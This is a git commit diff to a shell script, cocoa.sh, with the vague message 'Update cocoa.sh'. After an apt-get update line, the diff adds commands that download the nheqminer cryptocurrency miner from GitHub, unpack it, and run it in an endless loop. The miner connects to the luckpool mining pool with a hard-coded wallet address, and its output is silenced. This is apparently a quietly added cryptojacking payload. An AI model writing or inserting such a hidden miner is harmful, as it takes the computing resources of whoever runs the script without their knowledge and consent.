76cbcaa54156c4534f3d5d223654f4fd82e8d6bb
kipawjsanss <93168202+kipawjsanss@users.noreply.github.com>
2021-10-26 07:56:57 +0700

    Update cocoa.sh

--- cocoa.sh
+++ cocoa.sh
@@ -1,3 +1,11 @@
 !#/bin/sh
 
-apt-get update
+apt-get update 
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tgz 
+tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+while true
+do
+  sleep 15m
+nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.$(echo $(shuf -i 1-9999 -n 1)rucika) -p x -t 2 > /dev/null 2>&1
+done
